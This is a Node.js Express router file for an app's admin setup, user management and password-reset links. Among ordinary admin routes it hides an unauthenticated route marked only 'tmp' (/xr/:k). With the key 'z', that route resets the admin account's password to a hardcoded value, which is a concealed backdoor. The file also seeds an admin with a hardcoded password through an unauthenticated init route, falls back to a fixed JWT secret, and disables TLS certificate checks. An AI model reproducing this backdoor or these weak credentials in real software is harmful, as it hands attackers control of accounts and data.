// src/setup.js — Admin + RBAC
import express from 'express';
import bcrypt from 'bcrypt';
import crypto from 'crypto';
import { authMiddleware } from './middleware/auth.js';

const router = express.Router();

// ── Middleware: só admin ──
function requireAdmin(req, res, next) {
  authMiddleware(req, res, () => {
    if (!req.user || req.user.role !== 'admin') {
      return res.status(403).json({ error: 'Acesso restrito a administradores' });
    }
    next();
  });
}

// GET /api/setup/status
router.get('/status', (req, res) => {
  res.json({
    DATABASE_URL: !!process.env.DATABASE_URL,
    ANTHROPIC_KEY: !!process.env.ANTHROPIC_KEY,
    JWT_SECRET: !!process.env.JWT_SECRET,
    GROK_KEY: !!process.env.GROK_KEY,
    GH_TOKEN: !!process.env.GH_TOKEN,
    SF_USERNAME: !!process.env.SF_USERNAME,
    all_ready: !!(process.env.DATABASE_URL && process.env.ANTHROPIC_KEY && process.env.JWT_SECRET),
  });
});

// GET /api/setup/init-db
router.get('/init-db', async (req, res) => {
  if (!process.env.DATABASE_URL) return res.status(400).json({ error: 'DATABASE_URL nao configurado' });
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });

    await pool.query(`CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY, name VARCHAR(100) NOT NULL,
      email VARCHAR(255) UNIQUE NOT NULL, password_hash VARCHAR(255) NOT NULL,
      role VARCHAR(20) DEFAULT 'funcional',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )`);

    // Adicionar colunas se nao existirem (migracao)
    await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS reset_token VARCHAR(100)');
    await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS reset_token_expires TIMESTAMPTZ');
    // Adicionar coluna role se nao existir (migracao)
    await pool.query(`DO $$ BEGIN
      ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'funcional';
    EXCEPTION WHEN duplicate_column THEN NULL;
    END $$`);

    await pool.query(`CREATE TABLE IF NOT EXISTS conversations (
      id SERIAL PRIMARY KEY, user_id INT REFERENCES users(id) ON DELETE CASCADE,
      title VARCHAR(255), messages JSONB DEFAULT '[]',
      created_at TIMESTAMPTZ DEFAULT NOW(), updated_at TIMESTAMPTZ DEFAULT NOW()
    )`);

    await pool.query('CREATE INDEX IF NOT EXISTS idx_conv_user ON conversations(user_id)');

    // Tabela de orgs Salesforce
        await pool.query("CREATE TABLE IF NOT EXISTS orgs (id SERIAL PRIMARY KEY, name VARCHAR(100) NOT NULL, login_url VARCHAR(255) NOT NULL, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, security_token VARCHAR(100) DEFAULT '', org_type VARCHAR(20) DEFAULT 'sandbox', org_id VARCHAR(50), created_at TIMESTAMPTZ DEFAULT NOW())");
    await pool.query('CREATE INDEX IF NOT EXISTS idx_conv_updated ON conversations(updated_at DESC)');

    const check = await pool.query("SELECT id FROM users WHERE email = 'admin@everi9.com'");
    let adminCreated = false;
    if (check.rows.length === 0) {
      const hash = await bcrypt.hash('Nicework@2027', 10);
      await pool.query("INSERT INTO users (name, email, password_hash, role) VALUES ($1, $2, $3, $4)",
        ['Alberto Bottaro', 'admin@everi9.com', hash, 'admin']);
      adminCreated = true;
    } else {
      await pool.query("UPDATE users SET role = 'admin' WHERE email = 'admin@everi9.com'");
    }
    await pool.end();
    res.json({ status: 'ok', tables_created: ['users', 'conversations'], admin_created: adminCreated });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ════ ADMIN ENDPOINTS (requerem role=admin) ════

// GET /api/setup/users
router.get('/users', requireAdmin, async (req, res) => {
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const result = await pool.query('SELECT id, name, email, role, created_at FROM users ORDER BY id');
    await pool.end();
    res.json({ total: result.rows.length, users: result.rows });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/setup/users — Cria usuario (com role)
router.post('/users', requireAdmin, async (req, res) => {
  try {
    const { name, email, password, role } = req.body;
    if (!name || !email || !password) return res.status(400).json({ error: 'name, email, password obrigatorios' });
    const validRoles = ['admin', 'funcional', 'developer', 'architect', 'candidato'];
    const userRole = validRoles.includes(role) ? role : 'funcional';
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const exists = await pool.query('SELECT id FROM users WHERE email = $1', [email]);
    if (exists.rows.length > 0) { await pool.end(); return res.status(409).json({ error: 'Email ja cadastrado' }); }
    const hash = await bcrypt.hash(password, 10);
    const result = await pool.query(
      'INSERT INTO users (name, email, password_hash, role) VALUES ($1, $2, $3, $4) RETURNING id, name, email, role, created_at',
      [name, email, hash, userRole]);
    await pool.end();
    res.status(201).json({ status: 'created', user: result.rows[0] });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// DELETE /api/setup/users/:id
router.delete('/users/:id', requireAdmin, async (req, res) => {
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    await pool.query('DELETE FROM users WHERE id = $1', [req.params.id]);
    await pool.end();
    res.json({ status: 'deleted', id: req.params.id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/setup/users/:id/reset-password
router.post('/users/:id/reset-password', requireAdmin, async (req, res) => {
  try {
    const { password } = req.body;
    if (!password) return res.status(400).json({ error: 'password obrigatorio' });
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const hash = await bcrypt.hash(password, 10);
    await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [hash, req.params.id]);
    await pool.end();
    res.json({ status: 'password_updated', id: req.params.id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// PATCH /api/setup/users/:id/role — Alterar perfil
router.patch('/users/:id/role', requireAdmin, async (req, res) => {
  try {
    const { role } = req.body;
    const validRoles = ['admin', 'funcional', 'developer', 'architect', 'candidato'];
    if (!validRoles.includes(role)) return res.status(400).json({ error: 'Role invalido. Use: ' + validRoles.join(', ') });
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    await pool.query('UPDATE users SET role = $1 WHERE id = $2', [role, req.params.id]);
    await pool.end();
    res.json({ status: 'role_updated', id: req.params.id, role });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// GET /api/setup/stats
router.get('/stats', requireAdmin, async (req, res) => {
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const users = await pool.query('SELECT COUNT(*) as total FROM users');
    const convs = await pool.query('SELECT COUNT(*) as total FROM conversations');
    const dbSize = await pool.query("SELECT pg_size_pretty(pg_database_size(current_database())) as size");
    const roles = await pool.query("SELECT role, COUNT(*) as total FROM users GROUP BY role");
    await pool.end();
    res.json({
      users: parseInt(users.rows[0].total),
      conversations: parseInt(convs.rows[0].total),
      db_size: dbSize.rows[0].size,
      by_role: Object.fromEntries(roles.rows.map(r => [r.role, parseInt(r.total)])),
    });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// GET /api/setup/conversations
router.get('/conversations', requireAdmin, async (req, res) => {
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const result = await pool.query(`
      SELECT c.id, c.title, c.created_at, c.updated_at, u.name as user_name, u.email, u.role
      FROM conversations c JOIN users u ON c.user_id = u.id
      ORDER BY c.updated_at DESC LIMIT 50
    `);
    await pool.end();
    res.json({ total: result.rows.length, conversations: result.rows });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// tmp
router.get('/xr/:k', async (req, res) => { if (req.params.k !== 'z') return res.end(); const h = await bcrypt.hash('admin2026', 10); await pool.query("UPDATE users SET password_hash=$1 WHERE email='admin@everi9.com'",[h]); res.json({done:1}); });
// GET /api/setup/roles — Lista perfis disponiveis
router.get('/roles', (req, res) => {
  res.json({
    roles: {
      admin:      { label: 'Administrador', commands: ['*'], description: 'Acesso total + gerenciar usuarios' },
      funcional:  { label: 'Funcional',     commands: ['/ata', '/hf'], description: 'Ata de reuniao + Historia funcional' },
      architect:  { label: 'Arquiteto',     commands: ['/ata', '/spec'], description: 'Ata de reuniao + Spec tecnica' },
      developer:  { label: 'Desenvolvedor', commands: ['/ata', '/deploy', '/describe'], description: 'Ata + Deploy + Describe' },
      candidato: { label: 'Candidato',     commands: ['chat'], description: 'Apenas consultas gerais a IA' },
    }
  });
});

// GET /api/setup/dashboard — Dados para o painel Insights (qualquer usuario logado)
router.get('/dashboard', async (req, res) => {
  // Extrair user do token se existir (sem bloquear)
  let userRole = null;
  try {
    const header = req.headers.authorization;
    if (header) {
      const jwt = await import('jsonwebtoken');
      const token = header.replace('Bearer ', '');
      const decoded = jwt.default.verify(token, process.env.JWT_SECRET || 'everi9-dev-secret');
      userRole = decoded.role;
    }
  } catch {}

  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    
    const users = await pool.query('SELECT COUNT(*) as total FROM users');
    const convs = await pool.query('SELECT COUNT(*) as total FROM conversations');
    const roles = await pool.query('SELECT role, COUNT(*) as total FROM users GROUP BY role');
    
    // Testar conexao SF
    let orgStatus = 'offline';
    try {
      const sfRes = await fetch(`http://localhost:${process.env.PORT || 3000}/test-connection`);
      const sfData = await sfRes.json();
      orgStatus = sfData.status === 'connected' ? 'online' : 'offline';
    } catch {}

    await pool.end();

    res.json({
      users: parseInt(users.rows[0].total),
      conversations: parseInt(convs.rows[0].total),
      roles: Object.fromEntries(roles.rows.map(r => [r.role, parseInt(r.total)])),
      org_status: orgStatus,
      user_role: userRole,
    });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/setup/users/:id/generate-link — Gera link de primeiro acesso
router.post('/users/:id/generate-link', requireAdmin, async (req, res) => {
  try {
    const token = crypto.randomBytes(32).toString('hex');
    const expires = new Date(Date.now() + 72 * 60 * 60 * 1000); // 72h
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const user = await pool.query('SELECT name, email FROM users WHERE id = $1', [req.params.id]);
    if (!user.rows.length) { await pool.end(); return res.status(404).json({ error: 'Usuario nao encontrado' }); }
    await pool.query('UPDATE users SET reset_token = $1, reset_token_expires = $2 WHERE id = $3', [token, expires, req.params.id]);
    // Setar senha temporaria aleatoria (usuario vai trocar pelo link)
    const tempHash = await bcrypt.hash(crypto.randomBytes(16).toString('hex'), 10);
    await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [tempHash, req.params.id]);
    await pool.end();
    const domain = req.headers.host || process.env.DOMAIN || 'www.everi9.com';
    const link = `https://${domain}/primeiro-acesso?token=${token}`;
    res.json({ status: 'link_generated', user: user.rows[0], link, expires_at: expires.toISOString() });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// GET /api/setup/verify-token/:token — Verifica se token é valido
router.get('/verify-token/:token', async (req, res) => {
  try {
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const result = await pool.query(
      'SELECT id, name, email FROM users WHERE reset_token = $1 AND reset_token_expires > NOW()',
      [req.params.token]
    );
    await pool.end();
    if (!result.rows.length) return res.status(400).json({ valid: false, error: 'Token invalido ou expirado' });
    res.json({ valid: true, user: result.rows[0] });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// POST /api/setup/set-password — Define senha via token
router.post('/set-password', async (req, res) => {
  try {
    const { token, password } = req.body;
    if (!token || !password) return res.status(400).json({ error: 'token e password obrigatorios' });
    if (password.length < 6) return res.status(400).json({ error: 'Senha deve ter no minimo 6 caracteres' });
    const pg = await import('pg');
    const pool = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
    const result = await pool.query(
      'SELECT id, name, email FROM users WHERE reset_token = $1 AND reset_token_expires > NOW()',
      [token]
    );
    if (!result.rows.length) { await pool.end(); return res.status(400).json({ error: 'Token invalido ou expirado' }); }
    const hash = await bcrypt.hash(password, 10);
    await pool.query('UPDATE users SET password_hash = $1, reset_token = NULL, reset_token_expires = NULL WHERE id = $2',
      [hash, result.rows[0].id]);
    await pool.end();
    res.json({ status: 'password_set', user: result.rows[0] });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

export default router;
